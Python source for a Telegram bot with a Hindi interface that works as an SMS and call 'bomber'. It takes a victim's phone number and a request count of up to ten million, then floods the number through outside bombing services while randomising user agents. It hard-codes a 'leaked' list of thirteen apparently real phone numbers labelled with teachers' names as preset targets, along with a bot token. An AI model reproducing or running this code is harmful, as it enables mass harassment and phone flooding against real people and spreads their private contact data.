import telebot,requests
from telebot import types
from fake_useragent import UserAgent
import flask
bot_token = "6951716495:AAGOgUO2X73NHh6pJuIrOWl-KKfIb32Q32k"
bot = telebot.TeleBot(bot_token)

user_states = {}

def start_message(user_first_name):
  return f"""_👋 नमस्ते, {user_first_name}!_ 🌟\n
_💥 SMS और Call बॉमर बॉट में आपका स्वागत है!_ 💣🚀\n
_इस बॉट के साथ मस्ती करो, लेकिन ध्यान रखो, ज्यादा उत्तेजित न होना!_ 😄🚫\n
_पीड़ित का फोन नंबर दर्ज करो (बिना +91) और थोड़ी मस्ती करो!_ 📱🔥\n
_ध्यान दो, ये सब सिर्फ हंसी मजाक के लिए है, किसी को चोट नहीं पहुंचाना है!_ 🎉🚨\n
_पागलपंती मत करना, वरना घर वालों को पछताना पड़ेगा!_ 🏠😅\n
_बॉट डेवलपर किसी भी उलटफेर के लिए ज़िम्मेदार नहीं हैं!_ 🤖🙅‍♂️💥"""

# Handle the /start command
@bot.message_handler(commands=['start'])
def start_command(message):
    chat_id = message.chat.id
    user_first_name = message.from_user.first_name
    message_text = start_message(user_first_name)
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    programmer_button = types.InlineKeyboardButton(text="👨🏻‍💻 SANCHIT 👨🏻‍💻", url="https://t.me/X668F")
    insta = types.InlineKeyboardButton(text="🔮 Follow Me On Instagram 🔮", url="https://www.instagram.com/sanch1t_")
    teachers = types.InlineKeyboardButton(text="💸 Premium Collection 💸", callback_data="teachers")
    keyboard.add(programmer_button, insta, teachers)
    bot.send_message(chat_id, message_text, reply_markup=keyboard, parse_mode='Markdown')

    # Store the user's state
    user_states[chat_id] = {'phone_number': None, 'num_requests': None}

    # Log the /start command
    print("/start command received.")

# List of disallowed phone numbers
disallowed_numbers = ["626309945"]

teacher_numbers = {'rd': '9981712592', 'ek': '9425535321', 'at': '8109674741', 'rkb': '8085162218', 'sky': '9425544453', 'pp': '9752876606', 'vr': '8269227984', 'mh': '8830360897', 'ch': '9893445395', 'ri': '8982870255', 'ku' : '9109234559', 'tor': '7067616341', 'ra': '9993455720'}

@bot.callback_query_handler(lambda query: query.data in ['teachers', 'back'])
def teachers_collection(query):
    chat_id = query.message.chat.id
    query_data = query.data

    if query_data == 'teachers':
        keyboard = types.InlineKeyboardMarkup()
        reena_button = types.InlineKeyboardButton(text="🌟👩‍🏫 Reena 👩‍🏫🌟", callback_data="rd")
        rashmi_button = types.InlineKeyboardButton(text="🌟👩‍🏫 Esther 👩‍🏫🌟", callback_data="ek")
        raj_button = types.InlineKeyboardButton(text="🌟👨‍🏫 Aditya 👨‍🏫🌟", callback_data="at")
        rkb_button = types.InlineKeyboardButton(text="🌟👨‍🏫 Baya 👨‍🏫🌟", callback_data="rkb")
        sky_button = types.InlineKeyboardButton(text="🌟👨‍🏫 Suryaketu 👨‍🏫🌟", callback_data="sky")
        pp_button = types.InlineKeyboardButton(text="🌟👨‍🏫 Mahesh 👨‍🏫🌟", callback_data="pp")
        vr_button = types.InlineKeyboardButton(text="🌟👩‍🏫 Varsha 👩‍🏫🌟", callback_data="vr")
        mh_button = types.InlineKeyboardButton(text="🌟👨‍🏫 Manendra 👨‍🏫🌟", callback_data="mh")
        ch_button = types.InlineKeyboardButton(text="🌟👨‍🏫 Chaturvedi 👨‍🏫🌟", callback_data="ch")
        ri_button = types.InlineKeyboardButton(text="🌟👨‍🏫 Rishi 👨‍🏫🌟", callback_data="ri")
        ku_button = types.InlineKeyboardButton(text="🌟👩‍🏫 Kaushalya 👩‍🏫🌟", callback_data="ku")
        ra_button = types.InlineKeyboardButton(text="🌟👨‍🏫 Rahul 👨‍🏫🌟", callback_data="ra")
        tor_button = types.InlineKeyboardButton(text="💥 Torwa 💥", callback_data="tor")
        back_button = types.InlineKeyboardButton(text="⬅️ Back", callback_data="back")
        keyboard.row(reena_button, raj_button)
        keyboard.row(rashmi_button, rkb_button)
        keyboard.row(sky_button, pp_button)
        keyboard.row(vr_button, mh_button)
        keyboard.row(ch_button, ri_button)
        keyboard.row(ku_button, ra_button)
        keyboard.row(tor_button)
        keyboard.row(back_button)
        sent_message = bot.send_message(chat_id, "✨ Leaked Premium Collection✨", reply_markup=keyboard)

    elif query_data == 'back':
        message_id = query.message.message_id
        bot.delete_message(chat_id=chat_id, message_id=message_id)
        bot.edit_message_reply_markup(chat_id=chat_id, message_id=message_id, reply_markup=None)

@bot.callback_query_handler(lambda query: query.data in ['rd', 'ek', 'at', 'rkb', 'sky', 'pp', 'vr', 'mh', 'ch', 'ri', 'ku', 'tor', 'ra'])
def handle_teachers_callback(query):
    chat_id = query.message.chat.id
    selected_button = query.data

    if selected_button in teacher_numbers:
        user_states[chat_id]['phone_number'] = teacher_numbers[selected_button]
        user_states[chat_id]['num_requests'] = None
        bot.send_message(chat_id, f"_🚀🔢 कृपया इस फ़ोन नंबर पर भेजने वाले अनुरोधों की संख्या दर्ज करें (अधिकतम 10000000): 🌟📲_", parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text.isdigit())
def handle_text(message):
    chat_id = message.chat.id
    text = message.text

    if chat_id not in user_states:
        return

    if user_states[chat_id]['phone_number'] is None:
        if len(text) == 10:
            if text in disallowed_numbers:
                bot.send_message(chat_id, "🚫 _इस नंबर को इस्तेमाल करना मना है!_ ❌", parse_mode="Markdown")
            else:
                user_states[chat_id]['phone_number'] = text
                user_states[chat_id]['num_requests'] = None
                bot.send_message(chat_id, f"_🚀🔢 कृपया इस फ़ोन नंबर पर भेजने वाले अनुरोधों की संख्या दर्ज करें (अधिकतम 10000000): 🌟📲_", parse_mode="Markdown")
        else:
            bot.send_message(chat_id, "_कृपया एक 10-अंकीय फोन नंबर दर्ज करें। 📱_.", parse_mode="Markdown")
    else:
        if user_states[chat_id]['num_requests'] is None:
            num_requests = int(text)
            if num_requests <= 10000000:
                user_states[chat_id]['num_requests'] = num_requests
                keyboard = types.InlineKeyboardMarkup()
                sms_button = types.InlineKeyboardButton(text="💥 Send SMS 💥", callback_data="send_sms")
                call_button = types.InlineKeyboardButton(text="☠️ Send Call ☠️", callback_data="send_call")
                keyboard.add(sms_button, call_button)
                bot.send_message(chat_id, "_कृपया कोई क्रिया चुनें: 🌟🤔_:", parse_mode="Markdown", reply_markup=keyboard)
            else:
                bot.send_message(chat_id, "_कृपया एक 10-अंकीय फोन नंबर दर्ज करें। 📱_.", parse_mode="Markdown")

@bot.callback_query_handler(lambda query: query.data in ['send_sms', 'send_call'])
def handle_bomb_button(query):
    chat_id = query.message.chat.id
    phone_number = user_states[chat_id]['phone_number']
    num_requests = user_states[chat_id]['num_requests']
    bomb_type = query.data.split('_')[1] if query.data.startswith('send') else None

    if bomb_type:
        initiate_bombing(chat_id, phone_number, num_requests, bomb_type)

success_messages = {}

def send_success_message(chat_id, bomb_type, num_requests):
    if chat_id not in success_messages:
        success_messages[chat_id] = {'message_id': None, 'count': 0}

    success_messages[chat_id]['count'] += 1
    edit_message_text = f"✅ _{bomb_type.capitalize()} Sended: {success_messages[chat_id]['count']} / {num_requests}_"

    if success_messages[chat_id]['message_id']:
        try:
            bot.edit_message_text(edit_message_text, chat_id, success_messages[chat_id]['message_id'], parse_mode="Markdown")
        except telebot.apihelper.ApiException as e:

            print(f"Error editing message")
            msg = bot.send_message(chat_id, edit_message_text, parse_mode="Markdown")
            success_messages[chat_id]['message_id'] = msg.message_id
    else:
        msg = bot.send_message(chat_id, edit_message_text, parse_mode="Markdown")
        success_messages[chat_id]['message_id'] = msg.message_id

def initiate_bombing(chat_id, phone_number, num_requests, bomb_type):
    user_states[chat_id]['pending_send'] = num_requests
    user_states[chat_id]['good_send'] = 0
    user_states[chat_id]['bad_send'] = 0
    user_states[chat_id]['bomb_type'] = bomb_type
    send_next_request(chat_id, phone_number, num_requests, bomb_type)

def send_next_request(chat_id, phone_number, num_requests, bomb_type):
    ua = UserAgent()
    if user_states[chat_id]['pending_send'] > 0:
        if bomb_type == "sms":
            headers = {
            'authority': 'smsbomber.tech',
            'method': 'POST',
            'path': '/index.php',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-encoding': 'gzip,deflate,br',
            'accept-language': 'en-US,en;q=0.9,id-ID;q=0.8,id;q=0.7,hi-IN;q=0.6,hi;q=0.5',
            'cache-control': 'max-age=0',
            'content-length': '13',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://smsbomber.tech',
            'pragma': 'akamai-x-cache-on,akamai-x-cache-remote-on,akamai-x-check-cacheable,akamai-x-get-cache-key,akamai-x-get-extracted-values,akamai-x-get-ssl-client-session-id,akamai-x-get-true-cache-key,akamai-x-serial-no,akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace',
            'referer': 'https://smsbomber.tech/index.php',
            'sec-ch-ua': '"Not:A-Brand";v="99","Chromium";v="112"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': ua.random
            }
            data = f"no={phone_number}"
            response = requests.post(f"https://smsbomber.tech/index.php", headers=headers, data=data)
        elif bomb_type == "call":
            response = requests.post(f"https://bomber-tools.xyz/?mobile={phone_number}&accesskey=BomberSmm&submit=Submit")

        if response.status_code == 200:
            user_states[chat_id]['good_send'] += 1
            user_states[chat_id]['pending_send'] -= 1

            if chat_id not in success_messages:
                send_success_message(chat_id, bomb_type, num_requests)
            else:                
                success_messages[chat_id]['count'] += 1
                edit_message_text = f"✅ _{bomb_type.capitalize()} Sended: {success_messages[chat_id]['count']} / {num_requests}_"
                bot.edit_message_text(edit_message_text, chat_id, success_messages[chat_id]['message_id'], parse_mode="Markdown")
        else:
            user_states[chat_id]['bad_send'] += 1
            user_states[chat_id]['pending_send'] -= 1
            update_report(chat_id, phone_number, num_requests, bomb_type)
        send_next_request(chat_id, phone_number, num_requests, bomb_type)
    else:
        bot.send_message(chat_id, "✅ _बमबारी पूर्ण हुई_!", parse_mode="Markdown", reply_markup=types.ReplyKeyboardRemove())

# Update the report
def update_report(chat_id, phone_number, num_requests, bomb_type):
    good_send = user_states[chat_id]['good_send']
    bad_send = user_states[chat_id]['bad_send']
    pending_send = user_states[chat_id]['pending_send']

    success_message = f"✅ _{bomb_type.capitalize()} Sended: {good_send} / {num_requests}_"
    bot.send_message(chat_id, success_message, parse_mode="Markdown")

server = flask.Flask(__name__)

# Handle incoming updates from Telegram
@server.route("/bot", methods=['POST'])
def getMessage():
    bot.process_new_updates([telebot.types.Update.de_json(flask.request.stream.read().decode("utf-8"))])
    return "!", 200

# Set up the webhook route
@server.route("/")
def webhook():
    bot.remove_webhook()
    link = 'https://'+str(flask.request.host)
    bot.set_webhook(url=f"{link}/bot")
    return "Sanchit Is Online !", 200

if __name__ == "__main__":
    # Run the Flask server
    server.run(host="0.0.0.0", port=9090)  # You can use port 
